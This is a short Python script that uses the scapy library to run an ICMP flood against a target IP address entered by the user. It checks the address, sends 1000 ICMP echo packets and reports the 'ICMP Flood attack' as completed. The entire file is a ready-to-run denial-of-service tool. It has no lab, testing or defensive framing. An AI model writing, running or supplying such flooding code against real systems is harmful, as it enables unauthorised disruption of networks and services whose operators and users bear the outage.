import socket
from scapy.all import IP, ICMP, send

def is_valid_ipv4_address(address):
    try:
        socket.inet_pton(socket.AF_INET, address)
        return True
    except AttributeError:  # inet_pton not available on Windows
        try:
            socket.inet_aton(address)
        except socket.error:
            return False
        return address.count('.') == 3
    except socket.error:  # not a valid address
        return False

def icmp_flood(target_ip, num_packets):
    packet = IP(dst=target_ip) / ICMP()
    for i in range(num_packets):
        send(packet, verbose=0)
        if (i + 1) % 100 == 0:
            print(f"Sent {i + 1} packets...")
    print(f"ICMP Flood attack completed on {target_ip} with {num_packets} packets.")

if __name__ == "__main__":
    TARGET_IP = input("Enter the target IP address: ")

    if is_valid_ipv4_address(TARGET_IP):
        NUMBER_OF_PACKETS = 1000
        try:
            icmp_flood(TARGET_IP, NUMBER_OF_PACKETS)
        except Exception as e:
            print(f"An error occurred: {e}")
    else:
        print("Invalid IP address format.")

